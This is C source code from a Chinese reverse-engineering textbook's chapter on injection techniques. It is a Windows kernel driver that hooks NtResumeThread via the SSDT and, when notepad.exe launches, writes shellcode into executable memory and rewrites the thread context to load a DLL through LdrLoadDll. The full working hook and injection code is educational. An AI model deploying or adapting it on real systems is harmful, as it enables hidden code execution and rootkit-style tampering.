/*-----------------------------------------------------------------------
第12章  注入技术
《加密与解密（第四版）》
(c)  看雪学院 www.kanxue.com 2000-2018
-----------------------------------------------------------------------*/

/*

  KernelResumeInject.C

  Author: achillis
  Last Updated: 2016-03-08

  This framework is generated by EasySYS 0.3.0
  This template file is copying from QuickSYS 0.3.0 written by Chunhua Liu

  Driver Tested On: (x86) WinXP / Win7 / Win10 

*/

#include "dbghelp.h"
#include "KernelResumeInject.h"
#include "AcCommon.h"
#include "ntifs.h"
#include <ntimage.h>

typedef struct _INJECT_DATA 
{
	BYTE  ShellCode[0xA0];
	ULONG PathToFile;//LdrLoadDll的第一个参数
	ULONG DllCharacteristics;
	ULONG pDllPath;//PUNICODE_STRING DllPath
	ULONG ModuleHandle; //Dll句柄
	ULONG AddrOfLdrLoadDll;//LdrLoadDll地址
	ULONG OriginalEIP;//原线程的EIP
	UNICODE_STRING usDllPath;//Dll路径
	WCHAR wDllPath[256];//Dll路径，也就是usDllPath中的Buffer
}INJECT_DATA;

typedef NTSTATUS
(NTAPI *PFN_NtResumeThread)(
	IN HANDLE ThreadHandle,
	OUT PULONG PreviousSuspendCount
    );

NTSTATUS
NTAPI
DetourNtResumeThread (
	IN HANDLE ThreadHandle,
	OUT PULONG PreviousSuspendCount
	);

BOOL InitServiceIndex();
BOOL InitGlobalVars();
NTSTATUS InjectShellCodeToProcessByModifyContext(PCONTEXT pContext,WCHAR *wstrDllPath);
VOID ShellCodeFun(VOID);


// Device driver routine declarations.
//

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT		DriverObject,
	IN PUNICODE_STRING		RegistryPath
	);

NTSTATUS
KernelresumeinjectDispatchCreate(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	);

NTSTATUS
KernelresumeinjectDispatchClose(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	);

NTSTATUS
KernelresumeinjectDispatchDeviceControl(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	);

VOID
KernelresumeinjectUnload(
	IN PDRIVER_OBJECT		DriverObject
	);

ULONG g_IndexNtResumeThread = 0;
char g_ServiceName[32]="NtResumeThread";
char g_szProcNameToInject[16]="notepad.exe"; //准备注入的进程的名字
WCHAR g_DllPathToInject[256] = L"C:\\MsgDll.dll";

PFN_NtResumeThread OriginalNtResumeThread;

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, KernelresumeinjectDispatchCreate)
#pragma alloc_text(PAGE, KernelresumeinjectDispatchClose)
#pragma alloc_text(PAGE, KernelresumeinjectDispatchDeviceControl)
#pragma alloc_text(PAGE, KernelresumeinjectUnload)
#endif // ALLOC_PRAGMA

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT		DriverObject,
	IN PUNICODE_STRING		RegistryPath
	)
{
	//
    // Create dispatch points for device control, create, close.
    //

    DriverObject->MajorFunction[IRP_MJ_CREATE]         = KernelresumeinjectDispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = KernelresumeinjectDispatchClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KernelresumeinjectDispatchDeviceControl;
    DriverObject->DriverUnload                         = KernelresumeinjectUnload;
	
	if (InitGlobalVars()==FALSE)
    {
		DbgPrint("[DriverEntry] InitGlobalVars Failed!\n");
		goto __failed;
    }
	OriginalNtResumeThread=(PFN_NtResumeThread)HookSSDTServiceByIndex(g_IndexNtResumeThread,(ULONG_PTR)DetourNtResumeThread);
	if (OriginalNtResumeThread==0)
	{
		DbgPrint("[DriverEntry] HookSSDTServiceByIndex Failed!\n");
		goto __failed;
	}
	dprintf("HOOK %s OK! FunAddr = 0x%X\n",g_ServiceName,OriginalNtResumeThread);
	
	DbgPrint("[KernelResumeInject] Loaded!\n");
    return STATUS_SUCCESS;

__failed:
	return STATUS_UNSUCCESSFUL;
}

NTSTATUS
KernelresumeinjectDispatchCreate(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	)
{
	NTSTATUS status = STATUS_SUCCESS;

    Irp->IoStatus.Information = 0;

	dprintf("[KernelResumeInject] IRP_MJ_CREATE\n");

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

NTSTATUS
KernelresumeinjectDispatchClose(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	)
{
	NTSTATUS status = STATUS_SUCCESS;

    Irp->IoStatus.Information = 0;

	dprintf("[KernelResumeInject] IRP_MJ_CLOSE\n");

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

NTSTATUS
KernelresumeinjectDispatchDeviceControl(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	)
{
	NTSTATUS status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	dprintf("[KernelResumeInject] IRP_MJ_DEVICE_CONTROL\n");

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

VOID
KernelresumeinjectUnload(
	IN PDRIVER_OBJECT		DriverObject
	)
{
	//驱动卸载时要取消安装的SSDT Hook
	UnhookSSDTServiceByIndex(g_IndexNtResumeThread,(ULONG_PTR)OriginalNtResumeThread);
    DbgPrint("[KernelResumeInject] Unloaded\n");
}

NTSTATUS
NTAPI
DetourNtResumeThread (
	IN HANDLE ThreadHandle,
	OUT PULONG PreviousSuspendCount
	)
{
	char *szCurProc = NULL;
	char *szTargetProc = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pTargetProc = NULL ;
	PETHREAD pTargetThread = NULL ;
	HANDLE hThreadID = 0 ;
	SIZE_T MemSize = 0x1000;
	PCONTEXT pContext = NULL ;

	szCurProc = PsGetProcessImageFileName(PsGetCurrentProcess());
	status = ObReferenceObjectByHandle(ThreadHandle,THREAD_ALL_ACCESS,PsThreadType,KernelMode,&pTargetThread,NULL);
	if (NT_SUCCESS(status))
	{
		//取得线程对应的进程
		pTargetProc = IoThreadToProcess(pTargetThread);
		szTargetProc = PsGetProcessImageFileName(pTargetProc);
		hThreadID = PsGetThreadId(pTargetThread);
		DbgPrint("%s is Resuming Thread (ThreadId = %d) in Process %s\n",
			szCurProc,hThreadID,szTargetProc);
		//启动notepad时
		//explorer.exe is Resuming Thread (ThreadId = 2724) in Process notepad.exe
		if ((PsGetCurrentProcess() != pTargetProc) //当前进程与目标进程不同，说明是在创建新进程，而不是进程内自己创建线程
			&& (_stricmp(szTargetProc,g_szProcNameToInject) == 0)) //判断目标进程是不是notepad
		{
			KeAttachProcess(pTargetProc);
			//先申请内存
			status = ZwAllocateVirtualMemory(NtCurrentProcess(),
				&pContext,0,&MemSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
			
			if (NT_SUCCESS(status))//alloc mem
			{
				DbgPrint("Alloc Memory for Context = 0x%p\n",pContext);
				RtlZeroMemory(pContext,sizeof(CONTEXT));
				pContext->ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
				status = PsGetContextThread(pTargetThread,pContext,UserMode);
				if (NT_SUCCESS(status))//GetContext
				{
					DbgPrint("EIP = 0x%p EAX = 0x%p\n",pContext->Eip , pContext->Eax);
					
					//此时eax指向线程的真正起点，对于进程的第一个线程来说，它就是入口点
					//注入ShellCode并修改Context.Eax
					status = InjectShellCodeToProcessByModifyContext(pContext,g_DllPathToInject);
					if (NT_SUCCESS(status))
					{
						DbgPrint("现在修改线程的Context!\n");
						pContext->ContextFlags = CONTEXT_INTEGER ;
						status = PsSetContextThread(pTargetThread,pContext,UserMode);
						if (NT_SUCCESS(status))
						{
							DbgPrint("修改线程的Context成功!\n");
							//释放内存
							ZwFreeVirtualMemory(NtCurrentProcess(),&pContext,&MemSize,MEM_RELEASE);
						}
						else
						{
							DbgPrint("修改线程的Context失败! status = 0x%08X\n",status);
						}
					}
					else
					{
						DbgPrint("向进程中插入ShellCode失败! status = 0x%08X\n",status);
					}
				}
				else
				{
					DbgPrint("获取线程的Context失败! status = 0x%08X\n",status);
				}	
			}
			else
			{
				DbgPrint("申请内存失败! status = 0x%08X\n",status);
			}
			
			
			KeDetachProcess();
			
		}
		ObDereferenceObject(pTargetThread);
	}

	status = OriginalNtResumeThread(ThreadHandle,PreviousSuspendCount);
	return status;
}

NTSTATUS InjectShellCodeToProcessByModifyContext(PCONTEXT pContext,WCHAR *wstrDllPath)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	ULONG uNtdllBase = 0 ;
	ULONG AddrOfLdrLoadDll = 0;
	INJECT_DATA *pData = NULL;
	SIZE_T MemSize = 0x1000;
	ULONG uShellCodeSize = 0 ;
	BYTE *pFunStart = NULL,*pFunEnd = NULL ,*pTemp = NULL;

	

	//取得ntdll的基址
	uNtdllBase = FindImageBase(NtCurrentProcess(),L"ntdll.dll");
	if (uNtdllBase != 0)
	{
		//先申请内存
		status = ZwAllocateVirtualMemory(NtCurrentProcess(),
			&pData,0,&MemSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);

		if (NT_SUCCESS(status))
		{
			dprintf("Allocated Mem = 0x%p\n",pData);
			dprintf("ntdll.dll Base = 0x%p \n",uNtdllBase);
			AddrOfLdrLoadDll = KeGetProcAddress(uNtdllBase,"LdrLoadDll");
			dprintf("LdrLoadDll = 0x%p \n",AddrOfLdrLoadDll);
			
			//
			//计算ShellCode的长度
			pFunStart = (BYTE*)ShellCodeFun;
			pTemp = pFunStart;
			
			pTemp += 0x30 ; //缩小搜索范围
			while (memcmp(pTemp,"\x90\x90\x90\x90\x90",5) != 0)
			{
				pTemp++;
			}
			
			//pTemp指向结束位置
			uShellCodeSize = pTemp - pFunStart;
			dprintf("ShellCode Len = 0x%X\n",uShellCodeSize);
			//保存ShellCode
			memcpy(pData->ShellCode,pFunStart,uShellCodeSize);

			//下面开始填充LdrLoadDll的参数
			//初始化PathToFile为NULL
			pData->PathToFile = 0;
			//初始化DllCharacteristics
			pData->DllCharacteristics = 0 ;
			//初始化UNICODE_STRING
			wcscpy(pData->wDllPath,wstrDllPath);
			pData->usDllPath.Buffer = pData->wDllPath;
			pData->usDllPath.MaximumLength = 256 * sizeof(WCHAR);
			pData->usDllPath.Length = wcslen(pData->wDllPath) * sizeof(WCHAR);
			
			//设置
			pData->pDllPath = (ULONG)&pData->usDllPath;
			pData->AddrOfLdrLoadDll = AddrOfLdrLoadDll;
			pData->OriginalEIP = (ULONG)pContext->Eax; //Eax才是线程的起点，EIP指向的是BaseThreadStart
			dprintf("Original EIP = 0x%p\n",pData->OriginalEIP);
			
			//修改Context
			pContext->Eax = (ULONG)pData ;
			status = STATUS_SUCCESS ;
			
		}
		else
		{
			DbgPrint("Alloc VirtualMemory failed! status = 0x%08X\n",status);
		}
		
	}

	
	return status;
}

__declspec( naked )
VOID ShellCodeFun(VOID)
{
	__asm
	{
		push eax  //占位，后面将被修改为转移地址
		pushad
		pushfd
		call Next
Next:
		pop ebx
		and bx,0 ;低位清零，即得到基址
		lea eax,dword ptr ds:[ebx]INJECT_DATA.ModuleHandle
		push eax		//pModuleHandle
		push dword ptr ds:[ebx]INJECT_DATA.pDllPath		//pDllPath
		lea eax,dword ptr ds:[ebx]INJECT_DATA.DllCharacteristics
		push eax //DllCharacteristics
		xor eax,eax
		push eax //PathToFile
		call dword ptr ds:[ebx]INJECT_DATA.AddrOfLdrLoadDll         ;  LdrLoadDll
		mov eax, dword ptr ds:[ebx]INJECT_DATA.OriginalEIP
		xchg [esp+0x24],eax  //交换eax为返回地址
		popfd
		popad
		retn
		nop
		nop
		nop
		nop
		nop
	}
}


BOOL InitGlobalVars()
{
	BOOL bResult = FALSE ;

	//通过查找ntdll的导出表，获取系统服务的索引
	bResult = InitServiceIndex();
	if (!bResult)
	{
		dprintf("[InitGlobalVars] Get ServiceIndex of %s Failed!\n",g_ServiceName);
		return FALSE;
	}

	return bResult;
}


BOOL InitServiceIndex()
{
	NTSTATUS status;
	MAP_IMAGE_INFO NtdllInfo = {0};
	ULONG ServiceIndex=0;
	ULONG_PTR FnAddr=0;
	ULONG_PTR MapedNtdllBase=0;
	char szNtdllPath[MAX_PATH] = "\\SystemRoot\\system32\\ntdll.dll";
	status = MapImageFile(szNtdllPath,&NtdllInfo);
	
	if (!NT_SUCCESS(status))
	{
		dprintf("[GetServiceIndex] Map Ntdll.dll Failed!\n");
		return FALSE;
	}
	
	MapedNtdllBase = (ULONG_PTR)NtdllInfo.MappedBase;
	g_IndexNtResumeThread = GetServiceIndexByName(MapedNtdllBase,"NtResumeThread");
	
	UnMapImageFile(&NtdllInfo);
	return TRUE;
}

